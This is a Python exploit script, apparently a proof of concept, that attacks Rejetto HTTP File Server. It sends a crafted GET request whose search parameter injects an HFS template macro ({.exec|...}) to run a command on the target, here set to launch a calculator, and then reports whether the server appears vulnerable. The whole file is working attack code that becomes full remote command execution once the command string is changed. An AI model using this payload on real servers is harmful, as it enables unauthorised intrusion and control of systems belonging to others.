import socket
import sys

timeout_duration = 5 # in seconds

cmd = "calc" # Will pop up a calculator on the target system

def send_request(host, port):
    # Construct the HTTP request
    request = "GET /?search=%25x%25url%25:%host%}{.exec|" + \
        cmd +                                               \
        ".}{.break.} HTTP/1.1\r\n" +                        \
        "Host:\r\n\r\n"

    # Create a socket
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(timeout_duration)
        
        try:
            # Connect to the server
            s.connect((host, port))
            # Send the HTTP request
            s.sendall(request.encode())
            # Receive the response
            response = s.recv(4096)

            if '200 OK' in response.decode():
                print("[+] The Rejetto instance seems to be VULNERABLE.")
            else:
                print("[+] The Rejetto instance seems NOT to be VULNERABLE.")

        except socket.timeout:
            print("[-] The request timed out. Exiting...")
        except socket.error as e:
            print(f"[-] Socket error: {e}")


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 exploit.py <host> <port>")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])

    send_request(host, port)
